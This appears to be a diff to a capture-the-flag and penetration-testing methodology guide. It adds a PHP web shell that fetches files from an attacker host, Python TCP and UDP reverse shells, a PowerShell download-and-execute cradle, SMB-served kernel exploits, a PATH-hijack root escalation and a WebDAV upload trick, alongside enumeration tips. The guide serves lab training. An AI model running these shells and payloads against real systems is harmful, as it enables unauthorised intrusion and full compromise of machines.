@@ -10,7 +10,7 @@ In solving any vulnerable machine, there are few stages:
 
 * :ref:`finding-the-ip-address`
 * :ref:`port-scanning`
-* :ref:`listen-to-the-interface`
+* :ref:`rabbit-holes`
 * :ref:`from-nothing-to-unprivileged-shell`
 * :ref:`unprivileged-shell-to-privileged-shell`
 
@@ -126,11 +126,15 @@ By using **amap**, we can identify if any SSL server is running on port 3445 or 
   Unidentified ports: none.
   amap v5.4 finished at 2016-08-10 05:48:16
 
+.. _rabbit-holes:
+
+Rabbit Holes?
+=============
 
 .. _listen-to-the-interface:
 
 Listen to the interface
-=======================
+------------------------
 
 We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.
 
@@ -153,6 +157,33 @@ While listening on port 4444, we might receive a something like a base64 encoded
   192.168.56.101: inverse host lookup failed: Unknown host
   connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
   0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh
+
+DNS Server
+----------
+
+If the targeted machine is running a DNS Server and we have possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.
+
+::
+
+ host <domain> <optional_name_server>
+ host -t ns <domain>           -- Name Servers
+ host -t a <domain>            -- Address
+ host -t aaaa <domain>         -- AAAA record points a domain or subdomain to an IPv6 address
+ host -t mx <domain>           -- Mail Servers
+ host -t soa <domain>          -- Start of Authority
+ host <IP>                     -- Reverse Lookup
+ host -l <Domain Name> <DNS Server> -- Domain Zone Transfer
+
+SSL Certificate
+---------------
+
+If the targetted machine is running https server and we are getting a apache default webpage on hitting the https://IPAddress, probably, check the alt-dns-name on the ssl-certificate, create a entry in /etc/hosts and browse with the https://alt-dns-name.
+
+::
+
+ | ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
+ | Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com
+
 
 .. _from-nothing-to-unprivileged-shell:
 
@@ -213,6 +244,11 @@ SecLists.Org Security Mailing List Archive
 ------------------------------------------
 
 There would be some days, when you won't find vulnerability in searchsploit. We should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug for that particular software. 
+
+Google-Vulns
+------------
+
+It is suggested that whenever you are googling something,  also try with the words such as ctf, github, python, tool etc. For example. Let's say, you are stuck in a docker or in a specific cms search for docker ctf or <cms_name> ctf/ github etc.
 
 Webservices
 -----------
@@ -455,8 +491,21 @@ PHP
   -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
   -data-urlencode <data> (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding. 
   -b, --cookie <data> (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".
- 
 
+ If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file
+
+ ::
+
+  <?php 
+   if (isset($_REQUEST['fupload'])) {
+    file_put_contents($_REQUEST['fupload'], file_get_contents("http://yourIP/" . $_REQUEST['fupload']));
+   };
+   if (isset($_REQUEST['cmd'])) {
+    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+   }
+  ?>
+
+  
 * **PHP Meterpreter**
 
  We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
@@ -510,9 +559,17 @@ Perl
 Python
 ^^^^^^
 
-.. code-block :: bash  
+TCP
+
+::  
 
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+UDP
+
+::
+
+ import os,pty,socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("10.10.14.17", 4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("/bin/sh");s.close()
 
 Java
 ^^^^
@@ -971,7 +1028,75 @@ If you have become a normal user of which you have a password, it would be a goo
 Windows Privilege Escalation
 ----------------------------
 
-If you have a meterpreter from a windows box, probably, the first thing would be to utilize
+If you have a shell/ meterpreter from a windows box, probably, the first thing would be to utilize
+
+SystemInfo
+^^^^^^^^^^
+Run system info and findout 
+
+* Operating System Version
+* Architecture : Whether x86 or x64.
+* Hotfix installed
+
+The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.
+::
+
+ systeminfo
+
+ Host Name:                 VICTIM-MACHINE
+ OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
+ OS Version:                6.1.7600 N/A Build 7600
+ OS Manufacturer:           Microsoft Corporation
+ OS Configuration:          Standalone Server
+ OS Build Type:             Multiprocessor Free
+ Registered Owner:          Windows User
+ Registered Organization:
+ Product ID:                00496-001-0001283-84782
+ Original Install Date:     18/3/2017, 7:04:46 ��
+ System Boot Time:          7/11/2017, 3:13:00 ��
+ System Manufacturer:       VMware, Inc.
+ System Model:              VMware Virtual Platform
+ System Type:               x64-based PC
+ Processor(s):              2 Processor(s) Installed.
+                            [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+                            [02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+ BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
+ Windows Directory:         C:\Windows
+ System Directory:          C:\Windows\system32
+ Boot Device:               \Device\HarddiskVolume1
+ System Locale:             el;Greek
+ Input Locale:              en-us;English (United States)
+ Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+ Total Physical Memory:     2.048 MB
+ Available Physical Memory: 1.640 MB
+ Virtual Memory: Max Size:  4.095 MB
+ Virtual Memory: Available: 3.665 MB
+ Virtual Memory: In Use:    430 MB
+ Page File Location(s):     C:\pagefile.sys
+ Domain:                    HTB
+ Logon Server:              N/A
+ Hotfix(s):                 N/A
+ Network Card(s):           1 NIC(s) Installed.
+                            [01]: Intel(R) PRO/1000 MT Network Connection
+                                  Connection Name: Local Area Connection
+                                  DHCP Enabled:    No
+                                  IP address(es)
+                                  [01]: 10.10.10.9
+
+
+If there are no Hotfixes installed, we can visit 
+
+::
+
+ C:\Windows\SoftwareDistribution\Download
+
+This directory is the temporary location for WSUS. Updates were downloaded here, doesn't mean were installed. Otherwise, we may visit 
+
+::
+
+ C:\Windows\WindowUpdate.log 
+
+which will inform if any hotfixes are installed.
 
 Metasploit Local Exploit Suggestor
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -979,10 +1104,20 @@ Metasploit local_exploit_suggester : The module suggests local meterpreter explo
 
   .. Note :: It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.
 
-Sherlock Powershell Script
-^^^^^^^^^^^^^^^^^^^^^^^^^^
+Sherlock and PowerUp Powershell Script
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-`Sherlock <https://github.com/rasta-mouse/Sherlock>`_ PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in     any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.
+* `Sherlock <https://github.com/rasta-mouse/Sherlock>`_ PowerShell script by rastamouse to quickly find missing software patches for local privilege escalation vulnerabilities. If the Metasploit local_exploit_suggester didn't resulted in any exploits. Probably, try Sherlock Powershell script to see if there any vuln which can be exploited.
+
+* `PowerUp <https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>`_ : PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
+
+The above can be executed by 
+
+::
+
+ view-source:10.10.10.X/shell.php?cmd=echo IEX (New-Object Net.WebClient).DownloadString("http://YourIP:8000/Sherlock.ps1"); | powershell -noprofile -
+
+ We execute powershell with noprofile and accept the input from stdin
 
 Windows Exploit Suggestor
 ^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -995,6 +1130,44 @@ If we are getting the below error on running local exploits of getuid in meterpr
  [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getuid: Operation failed: Access is denied.
 
 Possibly, migrate into a new process using post/windows/manage/migrate
+
+Windows Kernel Exploits
+^^^^^^^^^^^^^^^^^^^^^^^
+
+`Windows Kernel Exploits <https://github.com/SecWiki/windows-kernel-exploits>`_ contains most of the compiled windows exploits. One way of running these is either upload these on victim system and execute. Otherwise, create a smb-server using Impacket
+
+::
+
+ usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support] shareName sharePath
+
+ This script will launch a SMB Server and add a share specified as an argument. You need to be root in order to bind to port 445. No authentication will be enforced. Example: smbserver.py -comment 'My share' TMP /tmp
+
+ positional arguments:
+   shareName         name of the share to add
+   sharePath         path of the share to add
+
+
+Assuming, the current directory contains our compiled exploit, we can
+
+::
+
+ impacket-smbserver <sharename> `pwd`
+ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+ [*] Config file parsed
+ [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+ [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+ [*] Config file parsed
+ [*] Config file parsed
+ [*] Config file parsed
+
+Once, smbserver is up and running, we can execute code like
+
+::
+
+ view-source:VictimIP/shell.php?cmd=\\YourIP\ShareName\ms15-051x64.exe whoami
+
+ *Considering shell.php is our php oneliner to execute commands.
 
 ICMP Shell
 ^^^^^^^^^^
@@ -1038,7 +1211,7 @@ The above code is basically a reduced version of the powershell version of ICMP 
 
   ::
    
-   Invoke-Command -ComputerName localhost -PSCredential $credential -ScriptBlock {Command to be executed}
+   Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
    -ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn't work.
 
 * Possibly, we can execute the ICMP Shell code to get the shell as the new user.
@@ -1073,6 +1246,7 @@ Once, we have got the unprivileged shell, it is very important to check the belo
 * What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
 * What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).
 * What are the services running? (netstat -ln)
+* Check the entries in the crontab!
 
 
 What "Advanced Linux File Permissions" are used?
@@ -1155,15 +1329,12 @@ so we can create a file in temp:
 
 ::
 
-  echo "bash -i" >> /tmp/id 
-
-  or 
-
-  cp /bin/sh /tmp/id
+  echo "/bin/sh" >> /tmp/id
+  chmod +x /tmp/id
 
 :: 
 
-  www-data@yummy:/tmp$ cp /bin/sh id
+  www-data@yummy:/tmp$ echo "/bin/sh" >> /tmp/id
   www-data@yummy:/tmp$ export PATH=/tmp:$PATH
   www-data@yummy:/tmp$ which id
   /tmp/id
@@ -1173,7 +1344,7 @@ so we can create a file in temp:
   # /usr/bin/id
   uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
-By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp …” -> Linux searches the filesystem according to its path (here: in /tmp first) -> Our malicious /tmp/scp gets found and executed as root -> A new bash opens with root privileges.
+By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or "id" . So the chain of commands is: /opt/backjob switches user context to root (as it is suid) and tries to run “scp or id” -> Linux searches the filesystem according to its path (here: in /tmp first) -> Our malicious /tmp/scp or /tmp/id gets found and executed as root -> A new bash opens with root privileges.
 
 If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it's something like:
 
@@ -1718,6 +1889,8 @@ First things
 * Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!
 * Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.
 * If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
+* If there's a page where redirect is happening (for example, http://example.com or http://example.com/support.php redirects us to http://example.com/login.php) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.
+* `List of HTTP Headers <https://en.wikipedia.org/wiki/List_of_HTTP_header_fields>`_ : Quite important when you want to set headers/ cookies etc.
 
 htaccess - UserAgent
 ^^^^^^^^^^^^^^^^^^^^
@@ -2041,7 +2214,62 @@ If we have found a weak RSA public, we can use `RsaCtfTool <https://github.com/G
 
  openssl rsautl -decrypt -inkey privatekey.pem -in <encryptedfile> -out key.bin 
 
+The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example
 
+::
+
+ 5e14f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a
+
+Convert it in to binary using
+
+::
+
+ xxd -r -p ciphertext > ciphertext3
+
+
+RSA given q, p and e?
+^^^^^^^^^^^^^^^^^^^^^
+
+Taken from `RSA Given q,p and e <https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e>`_
+
+::
+
+ def egcd(a, b):
+    x,y, u,v = 0,1, 1,0
+    while a != 0:
+        q, r = b//a, b%a
+        m, n = x-u*q, y-v*q
+        b,a, x,y, u,v = a,r, u,v, m,n
+        gcd = b
+    return gcd, x, y
+
+ def main():
+
+    p = 1090660992520643446103273789680343
+    q = 1162435056374824133712043309728653
+    e = 65537
+    ct = 299604539773691895576847697095098784338054746292313044353582078965
+
+    # compute n
+    n = p * q
+
+    # Compute phi(n)
+    phi = (p - 1) * (q - 1)
+
+    # Compute modular inverse of e
+    gcd, a, b = egcd(e, phi)
+    d = a
+
+    print( "n:  " + str(d) );
+
+    # Decrypt ciphertext
+    pt = pow(ct, d, n)
+    print( "pt: " + str(pt) )
+
+ if __name__ == "__main__":
+    main()
+
+    
 Truecrypt Files
 ---------------
 
@@ -2334,7 +2562,7 @@ Others
  
  * WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
 
-* If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy.
+* If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf
 
 * Running Asterisk/ Elastix/ FreePBX or any PBX, probably try `SIPVicious <https://github.com/EnableSecurity/sipvicious>`_  suite is a set of tools that can be used to audit SIP based VoIP systems. Running http:\\IP\panel should provide us valid extensions.
 
@@ -2352,6 +2580,56 @@ Others
 
   unshadow passwd shadown
 
+* If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav to see which files are allowed 
+
+ ::
+
+  davtest -url http://10.10.10.15/
+  ********************************************************
+   Testing DAV connection
+  OPEN		SUCCEED:		http://10.10.10.15
+  ********************************************************
+  NOTE	Random string for this session: E3u9ISnNswYes0
+  ********************************************************
+   Creating directory
+  MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_E3u9ISnNswYes0
+  ********************************************************
+   Sending test files
+  PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+  PUT	asp	FAIL
+  PUT	aspx	FAIL
+  PUT	cgi	FAIL
+  PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+  PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+  PUT	shtml	FAIL
+  PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+  PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+  PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  ********************************************************
+   Checking for test file execution
+  EXEC	pl	FAIL
+  EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  EXEC	cfm	FAIL
+  EXEC	jhtml	FAIL
+  EXEC	php	FAIL
+  EXEC	jsp	FAIL
+  EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  
+  ********************************************************
+  /usr/bin/davtest Summary:
+  Created: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
+  PUT File: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+  Executes: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
+  Executes: http://10.10.10.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
+ 
+ Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a php meterpreter in a text file and then MOVE the .txt file to .php and execute the php file.
 
 * In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let's say the ramdump was saved at
 
@@ -2396,6 +2674,19 @@ Others
 
   * binascii.unhexlify(hexstr) to convert hex to string
   * base64.decodestring(str) to decode base64 string
+  * Convert number to hex
+
+   :: 
+     
+      hex(15)
+      '0xf'
+
+  * Convert hex to decimal
+
+   ::
+
+    s = "6a48f82d8e828ce82b82"
+    i = int(s, 16)
 
  * Getting out of more
   
